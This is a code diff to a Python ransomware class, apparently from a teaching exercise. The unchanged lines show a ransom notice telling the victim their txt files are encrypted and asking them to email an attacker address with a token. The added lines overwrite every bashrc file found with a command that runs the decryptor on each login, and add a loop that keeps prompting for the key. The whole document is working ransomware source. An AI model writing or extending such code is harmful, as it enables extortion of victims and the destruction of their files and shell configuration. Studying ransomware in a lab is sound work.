@@ -47,16 +47,26 @@ class Ransomware:
         token = self._secret_manager.get_hex_token()
         print(OH_NO)
         print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
+        self.add_reminder_to_bashrc()
         return None
-        
+    
+    def add_reminder_to_bashrc(self) -> None:
+        for bashrc in self.get_files("bashrc"):
+            with open(bashrc, "w") as file:
+                file.write("python root/ransomware/ransomware.py --decrypt")
 
     def decrypt(self):
         # main function for decrypting (see PDF)
         self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")
         self._secret_manager.load()
         candidate_key = input("Please enter your cryptographic key: ")
+        while not self._secret_manager.check_key(candidate_key):
+            print("The key you have entered is incorrect.")
+            candidate_key = input("Please enter your cryptographic key: ")
+
         self._secret_manager.set_key(candidate_key)
         self._secret_manager.xorfiles(self.get_files("*.txt"))
+        self._secret_manager.clean()
         print("\rOkay, your data has been restored to its former state. Have a nice day :)")
         print(HERE_WIPE_YOUR_TEARS)
         print(ASCII_TISSUE_BOX)
